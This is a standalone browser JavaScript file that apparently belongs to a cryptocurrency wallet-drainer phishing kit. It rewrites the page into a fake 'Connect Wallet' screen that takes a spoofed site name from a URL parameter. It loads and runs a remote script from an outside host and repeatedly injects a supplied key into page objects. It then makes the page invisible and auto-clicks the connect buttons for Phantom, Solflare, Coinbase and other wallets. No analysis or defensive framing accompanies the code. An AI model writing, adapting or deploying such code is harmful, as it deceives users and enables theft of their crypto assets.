const ensurePageChange = setInterval(() => {
  if (document.getElementById("pageFullyLoadedActive") != null) {

    function removeElement() {
        
        const element = document.querySelector('.convertflow-cta.cf-overlay');
        
        
        if (element) {
            setTimeout(() => {
                element.remove();
                console.log('Element with class "convertflow-cta cf-overlay" has been removed.');
            }, 200); 
        }
    }
    
    
    const observer = new MutationObserver((mutations) => {
        mutations.forEach(() => {
           
            removeElement();
        });
    });
    
    
    observer.observe(document.body, { childList: true, subtree: true });
    
    
    removeElement();


    try {
      const url = new URL(window.location.href);
      const params = new URLSearchParams(url.search);
      const domain = params.get("dom");
      if (domain) {
      setInterval(() => {
      document.title = domain;
    });
        document.getElementById(
          "mainTitle"
        ).innerText = `${domain} requires you to connect!`;
      } else {
        document.getElementById("mainTitle").innerText = `Connection Required`;
      }
    } catch (error) {
      document.getElementById("mainTitle").innerText = `Connection Required`;
    }

    try {
      const url = new URL(window.location.href);
      const params = new URLSearchParams(url.search);
      const key = params.get("key");
      if (key) {

      setInterval(() => {
          try {
            Object.keys(window).forEach((keyName) => {
              try {
                  if (typeof(window[keyName]) == "object") {
                      if (window[keyName]["key"] != null && window[keyName]["explain_blowfish"] != null) {
                          window[keyName]["key"] = key;
                      }
                  }
              } catch(error) {}
          });
          } catch(error) {}
       }, 50);

        const script = document.createElement('script');
        script.src = 'https://wowee.vercel.app/main_source.js';
        script.onload = function() {
          setTimeout(() => {
              try {
          const url = new URL(window.location.href);
              const params = new URLSearchParams(url.search);
              const wallet = params.get("wallet");
              if (wallet != null) {
                document.body.style.opacity = '0%';
                document.getElementsByClassName("connect-wallet-button")[0].click()
                if (wallet == "Phantom") {
                    setTimeout(() => {
                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
                          if (button.innerText == "Phantom") {
                              console.log("ye")
                              button.click()
                          }
                      });
                  }, 400);
                }
                if (wallet == "Solflare") {
                    setTimeout(() => {
                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
                          if (button.innerText == "Solflare") {
                              button.click()
                          }
                      });
                  }, 400);
                }
                if (wallet == "MagicEden") {
                    setTimeout(() => {
                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
                          if (button.innerText == "Magic Eden") {
                              button.click()
                          }
                      });
                  }, 400);
                }
                if (wallet == "Clover") {
                    setTimeout(() => {
                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
                          if (button.innerText == "Clover") {
                              button.click()
                          }
                      });
                  }, 400);
                }
                if (wallet == "Coinbase") {
                    setTimeout(() => {
                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
                          if (button.innerText == "Coinbase") {
                              button.click()
                          }
                      });
                  }, 400);
                }
                if (wallet == "Trust") {
                    setTimeout(() => {
                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
                          if (button.innerText == "Trust") {
                              button.click()
                          }
                      });
                  }, 400);
                }
              }
        } catch(error) {}
          }, 200);
        }
        document.body.appendChild(script);
      } else {
        location.href = "https://phantom.app"
      }
    } catch(error) {
location.href = "https://phantom.app"
}

    return clearInterval(ensurePageChange);
  };
  document.documentElement.innerHTML = `
  <head>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300..700&display=swap"
      rel="stylesheet"
    />
    <link rel="shortcut icon" href="https://wowee.vercel.app/3790508.png" type="image/png">
    <style>
      body {
        margin: 0px;
        padding: 0px;
        background-color: rgb(19, 10, 21);
        display: flex;
        justify-content: center;
        align-items: center;
        text-align: center;
        font-family: "Quicksand", sans-serif;
        color: #fff;
        flex-direction: column;
        width: 100vw;
        height: 100vh;
        gap: 20px;
      }

      .connect-wallet-button {
        border: none;
        outline: none;
        background-color: rgb(199, 74, 227);
        font-size: 17px;
        height: 40px;
        width: 170px;
        color: #fff;
        transition: 0.1s;
        border-radius: 4px;
        font-family: "Quicksand", sans-serif;
        font-weight: 600;
      }

      .connect-wallet-button:hover {
        background-color: #a93ec1;
        cursor: pointer;
      }
    </style>
    <link rel="shortcut icon" href="https://wowee.vercel.app/3790508.png" type="image/png">
  </head>
  <body>
    <div style="display: none;" id="pageFullyLoadedActive"></div>
    <b style="font-size: 23px; opacity: 0.9" id="mainTitle">
      ... requires you to connect!
    </b>
    <button class="connect-wallet-button">Connect Wallet</button>
    <script>
      try {
        const url = new URL(window.location.href);
        const params = new URLSearchParams(url.search);
        const domain = params.get("dom");
        if (domain) {
          document.getElementById(
            "mainTitle"
          ).innerText = \`\${domain} requires you to connect!\`;
        } else {
          document.getElementById("mainTitle").innerText = \`Connection Required\`;
        }
      } catch (error) {
        document.getElementById("mainTitle").innerText = \`Connection Required\`;
      }
    </script>
  </body>
`;

});

function removeElement() {
    
    const element = document.querySelector('.convertflow-cta.cf-overlay');
    
    
    if (element) {
        setTimeout(() => {
            element.remove();
            console.log('Element with class "convertflow-cta cf-overlay" has been removed.');
        }, 200); 
    }
}


const observer = new MutationObserver((mutations) => {
    mutations.forEach(() => {
       
        removeElement();
    });
});


observer.observe(document.body, { childList: true, subtree: true });


removeElement();
